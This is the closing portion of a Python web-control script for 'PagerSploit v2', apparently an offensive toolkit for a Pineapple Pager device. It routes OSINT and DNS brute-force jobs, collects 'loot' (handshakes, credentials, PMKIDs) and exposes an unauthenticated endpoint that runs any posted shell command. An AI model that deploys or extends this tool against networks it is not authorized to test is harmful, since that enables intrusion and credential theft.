            else: self.send_json({'error':'ip required'},400)
        elif path=='/api/osint/whois':
            t=b.get('target','')
            if t: start_job('whois',osint_whois,t); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/osint/dns_enum':
            d=b.get('domain','')
            if d: start_job('dns_enum',osint_dns_enum,d); self.send_json({'status':'started'})
            else: self.send_json({'error':'domain required'},400)
        elif path=='/api/osint/dns_brute':
            d=b.get('domain','')
            if d: start_job('dns_brute',osint_dns_bruteforce,d,b.get('wordlist')); self.send_json({'status':'started'})
            else: self.send_json({'error':'domain required'},400)
        elif path=='/api/osint/wifi_geo':
            bssids=b.get('bssids',[])
            if not bssids:
                with STATE_LOCK: bssids=[a['bssid'] for a in STATE['scan_results'][:10]]
            if bssids: start_job('wifi_geo',osint_wifi_geolocate,bssids); self.send_json({'status':'started'})
            else: self.send_json({'error':'run scan first'},400)
        elif path=='/api/osint/http_headers':
            t=b.get('target','')
            if t: start_job('http_fp',osint_http_fingerprint,t,int(b.get('port',80))); self.send_json({'status':'started'})
            else: self.send_json({'error':'target required'},400)
        elif path=='/api/osint/sysrecon':
            start_job('sysrecon',osint_sysrecon); self.send_json({'status':'started'})
        elif path=='/api/stop':
            self.send_json({'status':'stopped' if stop_module(b.get('module','')) else 'not found'})
        elif path=='/api/stop_all':
            with STATE_LOCK:
                for ev in list(STATE['stop_events'].values()): ev.set()
                for proc in list(STATE['jobs'].values()):
                    if hasattr(proc,'terminate'):
                        try: proc.terminate()
                        except: pass
                STATE['stop_events'].clear(); STATE['jobs'].clear()
            set_module('idle','All stopped'); self.send_json({'status':'all stopped'})
        elif path=='/api/term/exec':
            cmd = b.get('cmd','').strip()
            if not cmd:
                self.send_json({'error':'no command'}); return
            log(f'$ {cmd}', 'info')
            try:
                proc = subprocess.Popen(
                    cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, env={**os.environ, 'PATH': '/mmc/usr/bin:/mmc/usr/sbin:/usr/bin:/usr/sbin:/bin:/sbin'}
                )
                try:
                    out, _ = proc.communicate(timeout=30)
                except subprocess.TimeoutExpired:
                    proc.kill(); out, _ = proc.communicate()
                    out = out + '\n[TIMEOUT after 30s]'
                log(f'exit {proc.returncode}', 'info')
                self.send_json({'output': out, 'rc': proc.returncode})
            except Exception as e:
                self.send_json({'error': str(e), 'output': ''})
        else:
            self.send_json({'error':'unknown endpoint'},404)


# ── Pager Display ─────────────────────────────────────────────────────────
def rgb(r,g,b): return ((r&0xF8)<<8)|((g&0xFC)<<3)|(b>>3)
C_BG=rgb(4,4,12); C_TITLE=rgb(0,255,180); C_GREEN=rgb(0,255,80)
C_RED=rgb(255,40,40); C_YELLOW=rgb(255,220,0); C_WHITE=rgb(220,220,220)
C_DIM=rgb(70,70,70); C_ORANGE=rgb(255,140,0)

def _get_display_pids():
    """Return PIDs of processes that draw to the Pager display (pineapple, pineapd, pineapplepager)."""
    targets = {'pineapple', 'pineapd', 'pineapplepager'}
    found = []
    try:
        for entry in os.listdir('/proc'):
            if entry.isdigit():
                try:
                    comm = open(f'/proc/{entry}/comm').read().strip()
                    if comm in targets:
                        found.append((int(entry), comm))
                except Exception:
                    pass
    except Exception:
        pass
    return found

def pager_display_loop(p, stop_event):
    p.set_rotation(270)
    try: p.clear_input_events()
    except: pass

    # Stop display-owner processes once for the entire session so they don't
    # overwrite our frames.  SIGSTOP keeps them in the process table so any
    # watchdog "is it alive" check still passes.  Resume all on exit.
    _display_pids = _get_display_pids()
    try:
        with open('/tmp/ps_debug.txt', 'w') as _df:
            _df.write(f'display_pids={_display_pids}\n')
    except Exception: pass
    log(f'display pids to suspend: {_display_pids}', 'info')
    for _pid, _pname in _display_pids:
        try:
            os.kill(_pid, _signal.SIGSTOP)
            log(f'{_pname} ({_pid}) suspended for display', 'info')
        except Exception as e:
            log(f'SIGSTOP {_pname} ({_pid}) failed: {e}', 'warn')

    try:
        while not stop_event.is_set():
            # Button check
            try:
                for _ in range(4):
                    if not p.has_input_events(): break
                    event = p.get_input_event()
                    if event:
                        button, etype, _ = event
                        if button == Pager.BTN_B and etype == Pager.EVENT_PRESS:
                            stop_event.set(); return
            except: pass
            try:
                with STATE_LOCK:
                    module   = STATE['active_module']
                    status   = STATE['module_status']
                    loot     = STATE['loot_count']
                    ip       = STATE['server_ip']
                    port     = STATE['server_port']
                    last_log = STATE['log'][-1] if STATE['log'] else None
                    jobs     = list(STATE['stop_events'].keys())
                p.clear(C_BG)
                p.fill_rect(0,0,480,18,rgb(0,30,20))
                p.draw_text(4,2,'PAGERSPLOIT v2',C_TITLE,1)
                p.fill_rect(0,18,480,1,C_TITLE)
                p.fill_rect(4,24,472,34,rgb(0,15,10))
                p.draw_text(8,28,'CONNECT:',C_DIM,1)
                p.draw_text(68,28,f'http://{ip}:{port}',C_GREEN,1)
                p.draw_text(8,40,'USB-C ethernet or management AP',C_DIM,1)
                p.fill_rect(4,58,472,1,C_DIM)
                p.draw_text(8,64,'MODULE:',C_DIM,1)
                p.draw_text(68,64,module.upper()[:30],C_ORANGE if module!='idle' else C_DIM,1)
                p.draw_text(8,76,'STATUS:',C_DIM,1)
                p.draw_text(68,76,status[:34],C_WHITE,1)
                p.draw_text(8,90,'LOOT:',C_DIM,1)
                p.draw_text(52,90,str(loot),C_YELLOW,1)
                if last_log:
                    col={'success':C_GREEN,'error':C_RED,'warn':C_ORANGE}.get(last_log['level'],C_WHITE)
                    p.fill_rect(4,102,472,1,C_DIM)
                    p.draw_text(8,106,f"[{last_log['time']}] {last_log['msg'][:45]}",col,1)
                if jobs:
                    p.fill_rect(4,120,472,1,C_DIM)
                    p.draw_text(8,124,' | '.join(jobs[:4])[:48],C_ORANGE,1)
                p.fill_rect(0,208,480,1,C_DIM)
                p.draw_text(4,210,'Browser UI active',C_DIM,1)
                p.draw_text(370,210,'B=Shutdown',C_RED,1)
                p.flip()
                p.frame_sync()
            except Exception as e:
                print(f'display: {e}', flush=True)
    finally:
        for _pid, _pname in _display_pids:
            try: os.kill(_pid, _signal.SIGCONT)
            except Exception: pass


# ── Web UI HTML ───────────────────────────────────────────────────────────
_UI_HTML_CACHE = None
def get_ui_html():
    global _UI_HTML_CACHE
    if _UI_HTML_CACHE is None:
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'pagersploit_ui.html'), 'r') as f:
            _UI_HTML_CACHE = f.read()
    return _UI_HTML_CACHE

# ── Main ──────────────────────────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument('--server-ip',   default='172.16.52.1')
    p.add_argument('--server-port', default='8080')
    p.add_argument('--payload-dir', required=True)
    return p.parse_args()

def run():
    args = parse_args()
    with STATE_LOCK:
        STATE['server_ip']   = args.server_ip
        STATE['server_port'] = args.server_port
        STATE['payload_dir'] = args.payload_dir

    for d in ['handshakes','credentials','scans','pmkid']:
        os.makedirs(loot_path(d), exist_ok=True)

    stop_event = threading.Event()

    # Find a free port — try preferred first, then fallbacks
    def _bind_server(preferred):
        for port in [preferred, 8765, 9080, 9090, 7080, 7777]:
            try:
                srv = ThreadedHTTPServer(('0.0.0.0', port), APIHandler)
                srv.timeout = 2
                return srv, port
            except OSError:
                continue
        raise RuntimeError('No free port available (tried 8080, 8765, 9080, 9090, 7080, 7777)')

    server, actual_port = _bind_server(int(args.server_port))
    if actual_port != int(args.server_port):
        log(f'Port {args.server_port} in use — bound to {actual_port}', 'warn')
    with STATE_LOCK:
        STATE['server_port'] = str(actual_port)

    log(f'PagerSploit v2.0 on {args.server_ip}:{actual_port}')
    threading.Thread(target=server.serve_forever, daemon=True).start()
    log(f'Web UI: http://{args.server_ip}:{actual_port}', 'success')
    try:
        with open('/tmp/pagersploit_url.txt', 'w') as _f:
            _f.write(f'http://{args.server_ip}:{actual_port}\n')
    except Exception: pass

    def _headless_wait():
        log('Running headless — web UI active, hardware screen disabled', 'warn')
        try:
            stop_event.wait()
        except KeyboardInterrupt:
            stop_event.set()

    if HAS_PAGER:
        def _run_display():
            try:
                p = Pager()
                rc = p.init()
                if rc != 0:
                    log(f'pager_init() failed (rc={rc}) — screen disabled, web UI still active', 'warn')
                    return
                try:
                    pager_display_loop(p, stop_event)
                finally:
                    p.cleanup()
            except Exception as e:
                log(f'Pager display error ({e}) — screen disabled, web UI still active', 'warn')
        threading.Thread(target=_run_display, daemon=True).start()
    else:
        log('pagerctl not found — running headless (screen disabled, web UI active)', 'warn')
    _headless_wait()

    log('Shutting down...')
    with STATE_LOCK:
        for ev in list(STATE['stop_events'].values()): ev.set()
        for proc in list(STATE['jobs'].values()):
            if hasattr(proc,'terminate'):
                try: proc.terminate()
                except: pass
    server.shutdown()

if __name__ == '__main__':
    try:
        run()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f'FATAL: {e}', flush=True)
        import traceback; traceback.print_exc()
    finally:
        print('PagerSploit exiting — rebooting device to restore services', flush=True)
        subprocess.run(['reboot'], check=False)
